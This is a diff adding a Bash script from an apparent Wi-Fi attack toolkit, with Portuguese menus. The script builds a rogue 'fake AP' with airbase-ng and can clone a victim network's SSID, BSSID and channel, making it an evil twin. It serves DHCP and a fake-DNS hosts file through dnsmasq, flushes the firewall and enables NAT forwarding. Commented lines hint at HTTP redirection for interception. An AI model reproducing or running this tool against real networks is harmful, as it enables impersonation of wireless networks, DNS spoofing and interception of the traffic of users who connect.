@@ -1,0 +1,303 @@
+#!/bin/bash
+
+PWD="$(pwd)"
+CONFIG_DIR="$HOME/.wificrack"
+CONFIG_FILE="$CONFIG_DIR/config.conf"
+source "$CONFIG_FILE"
+source "$CONFIG_INTERFACE"
+
+source "${CONFIG_FAKEAP_FILE_DHCP}"
+source "${CONFIG_FAKEAP_FILE_WIRELESS}"
+
+touch "${CONFIG_FAKEAP_FILE_FAKEDNS}"
+
+INFORMATION() {
+    if [ -n "$INTERFACE" ]; then
+        INTERFACE_MAC="$(cat /sys/class/net/$INTERFACE/address)"
+    fi
+    
+    INTERFACE_MODE="$(cat /sys/class/net/$INTERFACE/type)" 
+    if [ "$INTERFACE_MODE" == "1" ]; then
+        INTERFACE_MODE_STATUS="[MODE MANAGED]"
+    elif [ "$INTERFACE_MODE" == "803" ]; then
+        INTERFACE_MODE_STATUS="[MODE MONITOR]"
+    else
+        INTERFACE_MODE_STATUS=""
+    fi
+    if [ -e "$CURRENT_ATTACK_FILE" ]; then
+        source "$CURRENT_ATTACK_FILE"
+    fi
+    
+    #clear
+    iwconfig
+    echo -e "\033[1;32m$INTERFACE\033[0m: \033[1;36m$INTERFACE_MAC\033[0m \033[1;35m$INTERFACE_MODE_STATUS\033[0m"
+    echo -e "\033[1;32m$INTERNET\033[0m: \033[1;36m$INTERNET_MAC\033[0m"
+    echo '==============================================================================='
+    echo -e "ATTACK FILE: \033[1;32m$CONFIG_ATTACK\033[0m \033[1;31m$CONFIG_ATTACK_STATUS\033[0m" 
+    echo
+}
+
+FAKEAP_START() {
+    #edit dnsmasq configuration
+    echo -e "
+    no-resolv
+    no-poll
+    interface=at0
+    bind-interfaces
+    dhcp-range=$DHCP_RANGE_START,$DHCP_RANGE_END,12h
+    dhcp-option=3,$DHCP_SERVER
+    dhcp-option=6,$DHCP_SERVER
+    server=8.8.8.8
+    addn-hosts=\"${CONFIG_FAKEAP_FILE_FAKEDNS}\"
+    dhcp-leasefile=/var/lib/misc/dnsmasq.leases
+    log-queries
+    log-dhcp
+    " > "${CONFIG_FAKEAP_FILE_DNSMASQ}"
+
+
+    #edit dhcpd configuration
+    #echo -e "
+    #Authoritative;
+    #Default-lease-time 600;
+    #Max-lease-time 7200;
+    #Subnet 192.168.100.0 netmask $DHCP_NETMASK {
+    #Option routers $DHCP_SERVER;
+    #Option subnet-mask $DHCP_NETMASK;
+    #Option domain-name “$FAKEAP_SSID”;
+    #Option domain-name-servers $DHCP_SERVER;
+    #Range $DHCP_RANGE_START $DHCP_RANGE_END;
+    #}
+    #" #> "${CONFIG_FAKEAP_FILE_DNSMASQ}"
+    #awk -F"." '{print $1"."$2"."$3"."1}'
+
+    #start fake ap
+    if [ -n "${FAKEAP_MAC}" ]; then
+        $TERMINAL "airbase-ng -a $FAKEAP_MAC -e $FAKEAP_SSID -c $FAKEAP_CHANNEL $INTERFACE" &
+
+    else
+        $TERMINAL "airbase-ng -e $FAKEAP_SSID -c $FAKEAP_CHANNEL $INTERFACE" &
+    fi
+    #ex: airbase-ng -e fake-ap -c 6 mon0
+    sleep 4
+
+
+    #IPTABLES
+    ifconfig at0 "${DHCP_SERVER}" netmask "${DHCP_NETMASK}" up
+    #removing iptables rules
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
+
+    #enable packet forward in iptables
+    iptables -P FORWARD ACCEPT
+    #link the wifi card and the card thats connected to the internet
+    iptables -t nat -A POSTROUTING -o "$INTERNET" -j MASQUERADE
+
+    #enable ip forward
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    #redirect port 80 -> 10000
+    #iptables –t nat –A PREROUTING –p tcp –destination-port 80 –j REDIRECT –to-port 10000
+
+    #ifconfig at0 192.168.1.1 netmask 255.255.255.0
+    #ifconfig at0 mtu 1400
+    #echo 1 > /proc/sys/net/ipv4/ip_forward
+    #iptables –t nat –A PREROUTNG –p udp –j DNAT –to <GATEWAY IP HERE>
+    #iptables –P FORWARD ACCEPT
+    #iptables --append FORWARD –-in-interface at0 –j ACCEPT
+    #iptables --table nat -append POSTROUTING --out-interface eth0 –j MASQUERADE
+    #iptables –t nat –A PREROUTING –p tcp –destination-port 80 –j REDIRECT –to-port 10000
+
+
+
+    #start dnsmasq
+    #/etc/init.d/dnsmasq restart
+    #dnsmasq -C "${CONFIG_FAKEAP_FILE_DNSMASQ}" -d
+    dnsmasq -C "${CONFIG_FAKEAP_FILE_DNSMASQ}" -H "${CONFIG_FAKEAP_FILE_FAKEDNS}" -d
+}
+
+FAKEAP_CONFIG() {
+    while : ; do
+        clear
+        echo -ne "
+            1 - DHCP Settings
+            2 - Wireless Settings
+            3 - Edit fake DNS \"${CONFIG_FAKEAP_FILE_FAKEDNS}\"
+            0 - Sair
+            
+            Escolha uma das opções: "
+        read OPTION
+        
+        case "$OPTION" in
+        1) "${FUNCTIONPATH}"/wificrack-5-fakeap_config_range.sh ;;
+        2) "${FUNCTIONPATH}"/wificrack-5-fakeap_config_wireless.sh ;;
+        3) nano "${CONFIG_FAKEAP_FILE_FAKEDNS}" ;;
+        0) break ;;
+        *) echo "INVALID OPTION!!!"
+        esac
+        
+    done
+}
+
+FAKEAP_CONFIG_RANGE() {
+    if [ -e "$CONFIG_FAKEAP_FILE_DHCP" ]; then
+        source "$CONFIG_FAKEAP_FILE_DHCP"
+    fi
+
+    SELECT_DHCP_SERVER="${DHCP_SERVER}"
+    SELECT_DHCP_RANGE_START="${DHCP_RANGE_START}"
+    SELECT_DHCP_RANGE_END="${DHCP_RANGE_END}"
+    SELECT_DHCP_NETMASK="${DHCP_NETMASK}"
+
+    SAVE() {
+    echo "DHCP_SERVER=\"$SELECT_DHCP_SERVER\"
+    DHCP_RANGE_START=\"$SELECT_DHCP_RANGE_START\"
+    DHCP_RANGE_END=\"$SELECT_DHCP_RANGE_END\"
+    DHCP_NETMASK=\"$SELECT_DHCP_NETMASK\"
+    " > "$CONFIG_FAKEAP_FILE_DHCP"
+    }
+
+
+    while : ; do
+        clear
+        if [ -z "$SELECT_DHCP_SERVER" ]; then
+            SELECT_DHCP_SERVER_STATUS="[NÃO CONFIGURADO]"
+        else
+            SELECT_DHCP_SERVER_STATUS=""
+        fi
+        if [ -z "$SELECT_DHCP_RANGE_START" ]; then
+            SELECT_DHCP_RANGE_START_STATUS="[NÃO CONFIGURADO]"
+        else
+            SELECT_DHCP_RANGE_START_STATUS=""
+        fi
+        if [ -z "$SELECT_DHCP_RANGE_END" ]; then
+            SELECT_DHCP_RANGE_END_STATUS="[NÃO CONFIGURADO]"
+        else
+            SELECT_DHCP_RANGE_END_STATUS=""
+        fi
+        if [ -z "$SELECT_DHCP_NETMASK" ]; then
+            SELECT_DHCP_NETMASK_STATUS="[NÃO CONFIGURADO]"
+        else
+            SELECT_DHCP_NETMASK_STATUS=""
+        fi
+        if [ -z "$SELECT_SAVE_FILE" ]; then
+            SELECT_SAVE_FILE=""
+        fi
+        
+        echo -ne "
+            1 - DHCP SERVER: \033[1;32m$SELECT_DHCP_SERVER\033[0m \033[1;31m$SELECT_DHCP_SERVER_STATUS\033[0m
+            2 - DHCP RANGE START: \033[1;32m$SELECT_DHCP_RANGE_START\033[0m \033[1;31m$SELECT_DHCP_RANGE_START_STATUS\033[0m
+            3 - DHCP RANGE END: \033[1;32m$SELECT_DHCP_RANGE_END\033[0m \033[1;31m$SELECT_DHCP_RANGE_END_STATUS\033[0m
+            4 - DHCP NETMASK: \033[1;32m$SELECT_DHCP_NETMASK\033[0m \033[1;31m$SELECT_DHCP_NETMASK_STATUS\033[0m
+            99 - Salvar $SELECT_SAVE_FILE
+            0 - Sair
+            
+            Escolha uma das opções: "
+        read OPTION
+        
+        case "$OPTION" in
+        1) echo -n "Digite o IP Address do servidor DHCP (ex: 192.168.100.1): " ; read SELECT_DHCP_SERVER  ;;
+        2) echo -n "Digite o Start IP Address (ex: 192.168.100.50): " ; read SELECT_DHCP_RANGE_START ;;
+        3) echo -n "Digite o End IP Address (ex: 192.168.100.200): " ; read SELECT_DHCP_RANGE_END ;;
+        4) echo -n "Digite a mascara de rede (ex: 255.255.255.0): " ; read SELECT_DHCP_NETMASK ;;
+        99) SAVE && SELECT_SAVE_FILE=" [Ultimo arquivo salvo em \033[1;32m$CONFIG_FAKEAP_FILE_DHCP\033[0m]"
+        ;;
+        0) break ;;
+        *) echo "INVALID OPTION!!!"
+        esac
+        
+    done
+
+}
+
+FAKEAP_CONFIG_WIRELESS() {
+    if [ -e "$CONFIG_FAKEAP_FILE_WIRELESS" ]; then
+        source "$CONFIG_FAKEAP_FILE_WIRELESS"
+    fi
+
+    SELECT_FAKEAP_SSID="${FAKEAP_SSID}"
+    SELECT_FAKEAP_CHANNEL="${FAKEAP_CHANNEL}"
+    SELECT_FAKEAP_MAC="${FAKEAP_MAC}"
+
+    SAVE() {
+    echo "FAKEAP_SSID=\"$SELECT_FAKEAP_SSID\"
+    FAKEAP_CHANNEL=\"$SELECT_FAKEAP_CHANNEL\"
+    FAKEAP_MAC=\"${SELECT_FAKEAP_MAC}\"
+    " > "$CONFIG_FAKEAP_FILE_WIRELESS"
+    }
+
+
+    while : ; do
+        clear
+        if [ -z "$SELECT_FAKEAP_SSID" ]; then
+            SELECT_FAKEAP_SSID_STATUS="[NÃO CONFIGURADO]"
+        else
+            SELECT_FAKEAP_SSID_STATUS=""
+        fi
+        
+        if [ -z "$SELECT_FAKEAP_CHANNEL" ]; then
+            SELECT_FAKEAP_CHANNEL_STATUS="[NÃO CONFIGURADO]"
+        else
+            SELECT_FAKEAP_CHANNEL_STATUS=""
+        fi
+        
+        if [ -z "$SELECT_FAKEAP_MAC" ]; then
+            SELECT_FAKEAP_MAC_STATUS="[NÃO CONFIGURADO]"
+        else
+            SELECT_FAKEAP_MAC_STATUS=""
+        fi
+        
+        if [ -z "$SELECT_SAVE_FILE" ]; then
+            SELECT_SAVE_FILE=""
+        fi
+        
+        echo -ne "
+            1 - FAKEAP SSID: \033[1;32m$SELECT_FAKEAP_SSID\033[0m \033[1;31m$SELECT_FAKEAP_SSID_STATUS\033[0m
+            2 - FAKEAP CHANNEL: \033[1;32m$SELECT_FAKEAP_CHANNEL\033[0m \033[1;31m$SELECT_FAKEAP_CHANNEL_STATUS\033[0m
+            3 - MAC Address - Deixe em branco por padrão (optional): \033[1;32m$SELECT_FAKEAP_MAC\033[0m \033[1;31m$SELECT_FAKEAP_MAC_STATUS\033[0m
+            98 - Import victim conf
+            99 - Salvar $SELECT_SAVE_FILE
+            0 - Sair
+            
+            Escolha uma das opções: "
+        read OPTION
+        
+        case "$OPTION" in
+        1) echo -n "Digite o SSID: " ; read SELECT_FAKEAP_SSID ;;
+        2) echo -n "Digite o channel: " ; read SELECT_FAKEAP_CHANNEL ;;
+        3) echo -n "Digite o mac address: " ; read SELECT_FAKEAP_MAC ;;
+        98)
+        if [ -e "$CURRENT_ATTACK_FILE" ]; then
+            source "${CURRENT_ATTACK_FILE}"
+            source "${CONFIG_ATTACK}"
+        fi
+        SELECT_FAKEAP_SSID="${ESSID}"
+        SELECT_FAKEAP_CHANNEL="${CHANNEL}"
+        SELECT_FAKEAP_MAC="${BSSID}"
+        ;;
+        99) SAVE && SELECT_SAVE_FILE=" [Ultimo arquivo salvo em \033[1;32m$CONFIG_FAKEAP_FILE_WIRELESS\033[0m]"
+        ;;
+        0) break ;;
+        *) echo "INVALID OPTION!!!"
+        esac
+        
+    done
+}
+
+while : ; do
+    INFORMATION
+    echo -n "
+    1 - Start FakeAP
+    99 - Configuration - required to create a fake AP
+    0 - Sair
+    
+    Escolha uma das opções: "
+    read FAKEAP_OPTION
+    
+    case "$FAKEAP_OPTION" in
+    1) $TERMINAL "\"${FUNCTIONPATH}\"/wificrack-5-fakeap_start.sh ; bash" ;;
+    99) $TERMINAL "\"${FUNCTIONPATH}\"/wificrack-5-fakeap_config.sh" ;;
+    0) break ;;
+    *) echo "INVALID OPTION!!!" ;;
+    esac
+done
